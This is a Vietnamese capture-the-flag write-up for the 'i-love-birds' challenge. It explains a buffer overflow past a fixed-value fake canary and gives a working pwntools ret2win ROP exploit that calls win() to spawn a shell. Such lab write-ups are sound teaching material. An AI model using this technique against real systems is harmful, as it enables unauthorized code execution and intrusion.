# i-love-birds

## Tổng quan

Chương trình đưa ra một thông báo rằng đã tự thêm một cơ chế canary để ngăn chặn tấn công tràn bộ đệm. Tuy nhiên, việc bảo vệ này không hiệu quả nếu ta phân tích kỹ. Mục tiêu của thử thách là chiếm quyền điều khiển luồng thực thi và thực thi hàm `system("/bin/sh")` bằng cách khai thác lỗi buffer overflow và vượt qua kiểm tra canary.

---

## Phân tích mã nguồn

Đoạn mã chính của chương trình:

```c
unsigned int canary = 0xDEADBEEF;
char buf[64];

puts("I made a canary to stop buffer overflows. Prove me wrong!");
gets(buf);

if (canary != 0xDEADBEEF) {
    puts("No stack smashing for you!");
    exit(1);
}
```

Trong đoạn mã trên, biến `canary` được sử dụng như một biện pháp kiểm tra việc tràn bộ nhớ. Tuy nhiên, vì đây chỉ là biến cục bộ có giá trị cố định, nên hoàn toàn có thể ghi đè chính xác lại nó nếu biết vị trí trong stack.

Chương trình còn có một hàm `win(int)` như sau:

```c
void win(int secret) {
    if (secret == 0xA1B2C3D4) {
        system("/bin/sh");
    }
}
```

Để thực thi thành công hàm `win()`, cần phải truyền đúng giá trị tham số `secret = 0xA1B2C3D4`.

---

## Kiểm tra bảo mật

Sử dụng `checksec`, ta có thể thấy binary không bật stack canary mặc định, không có PIE, nhưng có NX.

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

Do đó, đây là một bài buffer overflow điển hình có thể áp dụng kỹ thuật ret2win.

---

## Phân tích cấu trúc stack

Qua phân tích với IDA, ta có stack frame như sau:

```
-0000000000000050     _BYTE buf[76]           // 76 byte (gồm cả padding)
-0000000000000004     _DWORD canary           // 4 byte
+0000000000000000     _QWORD saved RBP        // 8 byte
+0000000000000008     _QWORD return address   // 8 byte
```

→ Tổng cộng cần ghi đè 76 byte để tràn qua vùng nhớ của `buf`, sau đó ghi chính xác lại `canary`, rồi tiếp tục tràn qua `RBP`, và cuối cùng là ghi đè `RIP`.

---

## Kỹ thuật khai thác

Vì chương trình không có cách nào để gọi trực tiếp `win()` với tham số hợp lệ, nên ta cần dựng một chuỗi ROP nhỏ để:

1. Đưa giá trị `0xA1B2C3D4` vào thanh ghi RDI (theo ABI của hệ thống x64).
2. Gọi tới địa chỉ của hàm `win()`.

Để làm điều đó, ta cần tìm một gadget phù hợp để thao tác với RDI. Sử dụng `ROPgadget`:

```
0x4011c0 : pop rdi ; nop ; pop rbp ; ret
```

Địa chỉ hàm `win()` là:

```
0x4011c4
```

---

## Payload khai thác

Cấu trúc payload sẽ bao gồm:

- 76 byte để tràn qua buffer.
- 4 byte giá trị `0xDEADBEEF` để vượt qua kiểm tra canary.
- 8 byte pad cho saved RBP.
- Địa chỉ gadget `pop rdi ; ...`.
- Giá trị tham số `0xA1B2C3D4`.
- 8 byte pad cho lệnh `pop rbp` (gadget yêu cầu).
- Địa chỉ hàm `win()`.

Mã Python khai thác sử dụng pwntools:

```python
from pwn import *

context.log_level = 'debug'

win_addr = 0x4011c4
pop_rdi = 0x4011c0

payload = b'A' * 76
payload += p32(0xDEADBEEF)
payload += b'B' * 8
payload += p64(pop_rdi)
payload += p64(0xA1B2C3D4)
payload += p64(0)
payload += p64(win_addr)

p = process('./birds')
# p = remote('tjc.tf', 31625)
p.sendlineafter("wrong!\n", payload)
p.interactive()
```

---

## Kết quả

- Không phát hiện sai lệch ở giá trị canary.
- Thiết lập thanh ghi RDI với giá trị cần thiết.
- Gọi hàm `win()` với tham số đúng.
- Mở một shell và cho phép đọc nội dung file `flag.txt`.
